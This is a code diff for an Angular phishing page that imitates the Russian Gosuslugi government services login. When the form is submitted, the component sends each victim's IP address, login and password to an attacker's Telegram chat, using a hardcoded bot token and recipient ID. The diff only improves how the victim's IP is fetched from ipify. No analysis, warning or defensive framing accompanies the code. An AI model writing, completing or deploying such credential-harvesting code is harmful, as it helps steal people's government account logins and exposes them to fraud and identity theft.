@@ -1,9 +1,14 @@
 import {BreakpointObserver, Breakpoints} from '@angular/cdk/layout';
 import {HttpClient} from '@angular/common/http';
 import {Component, OnInit, ViewEncapsulation} from '@angular/core';
+import {Observable, Subscription} from 'rxjs';
 import {first, map, tap} from 'rxjs/operators';
 import Telegram from 'telegram-send-message';
 import {FormBuilder, Validators} from '@angular/forms';
+
+interface IPInfo {
+	ip: string;
+}
 
 @Component({
 	selector: 'app-root',
@@ -23,11 +28,12 @@ export class AppComponent implements OnInit {
 	};
 	selected = 'ru';
 	isSmallScreen = false;
-	ipAddress: string;
+	ipAddress: string | any;
 
 	sentMessage(): void {
+		console.log(this.ipAddress ? this.ipAddress.ip : ' ');
 		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
-			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
+			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress ? this.ipAddress.ip : ' '}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
 			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
 			Telegram.setToken(token);
 			Telegram.setRecipient('880595419');
@@ -49,11 +55,12 @@ export class AppComponent implements OnInit {
 		private http: HttpClient
 	) {}
 
+	getIPInfo(): Observable<IPInfo | any> {
+		return this.http.get('http://api.ipify.org/?format=json').pipe(first());
+	}
+
 	ngOnInit(): void {
-		this.http.get('http://api.ipify.org/?format=text').pipe(
-			first(),
-			tap((value) => console.log(value)),
-		).subscribe(value => this.ipAddress = value);
+		this.getIPInfo().subscribe(value => this.ipAddress = value);
 		this.breakpointObserver.observe([Breakpoints.Small, Breakpoints.XSmall])
 			.pipe(
 				map((observer) => observer.matches)
@@ -65,6 +72,5 @@ export class AppComponent implements OnInit {
 		if (this.form.valid) {
 			this.sentMessage();
 		}
-		console.log(this.form.value);
 	}
 }
